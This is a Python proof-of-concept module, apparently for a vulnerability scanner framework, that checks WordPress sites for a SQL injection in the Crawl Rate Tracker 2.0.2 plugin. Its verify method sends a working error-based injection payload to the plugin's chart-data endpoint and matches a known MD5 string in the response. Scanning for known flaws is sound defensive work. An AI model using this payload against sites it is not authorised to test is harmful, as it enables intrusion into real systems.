# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '16de8a6c-ceab-43f4-95ef-57d422712ef6'
    name = 'WordPress Plugin Crawl Rate Tracker 2.0.2 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2011-08-30'  # 漏洞公布时间
    desc = '''
        WordPress Plugin Crawl Rate Tracker 2.0.2 SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/17755/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin Crawl Rate Tracker 2.0.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '178b56d2-32e5-4807-88c5-8ff70e07c1dd'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = ("/wp-content/plugins/crawlrate-tracker/sbtracking-chart-data.php?chart_data=1&page_url=-1%27%20AND%20EXTRACTVALUE(1,CONCAT(CHAR(58),MD5(3.14),CHAR(58)))--%20")
 
            target_url = arg + payload
            code, head,res, _, _ = hh.http(target_url)
                       
            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()